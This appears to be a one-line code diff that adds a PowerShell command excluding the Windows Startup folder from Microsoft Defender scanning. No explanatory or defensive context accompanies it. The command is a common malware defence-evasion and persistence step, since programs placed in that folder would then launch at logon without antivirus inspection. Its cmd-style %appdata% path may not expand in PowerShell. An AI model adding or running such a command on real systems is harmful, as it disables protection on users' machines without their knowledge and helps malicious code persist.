@@ -1,0 +1,1 @@
+﻿Add-MpPreference -ExclusionPath ("%appdata%\Microsoft\Windows\Start Menu\Programs\Startup")
